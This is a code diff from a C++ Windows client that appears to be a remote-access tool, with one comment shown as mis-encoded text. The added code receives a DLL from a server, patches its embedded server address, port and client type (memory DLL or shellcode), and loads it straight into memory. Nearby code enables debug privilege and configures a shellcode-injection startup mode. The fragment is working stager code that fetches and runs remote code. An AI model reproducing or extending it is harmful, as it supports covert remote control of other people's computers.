@@ -28,11 +28,7 @@ BOOL status = 0;
 
 HANDLE hEvent = NULL;
 
-#ifdef _DEBUG
 CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };
-#else
-CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };
-#endif
 
 //ÌáÉýÈ¨ÏÞ
 void DebugPrivilege()
@@ -248,6 +244,15 @@ public:
 		auto buffer = ReceiveDll(size);
 		if (nullptr == buffer)
 			return nullptr;
+		int pos = MemoryFind(buffer, FLAG_FINDEN, size, sizeof(FLAG_FINDEN) - 1);
+		if (-1 != pos) {
+			CONNECT_ADDRESS* addr = (CONNECT_ADDRESS*)(buffer + pos);
+			BYTE type = buffer[sizeof(PkgHeader) + 1];
+			addr->iType = type == MEMORYDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE;
+			memset(addr->szFlag, 0, sizeof(addr->szFlag));
+			strcpy(addr->szServerIP, g_ConnectAddress.ServerIP());
+			sprintf_s(addr->szPort, "%d", g_ConnectAddress.ServerPort());
+		}
 		m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
 		SAFE_DELETE_ARRAY(buffer);
 		return m_mod;
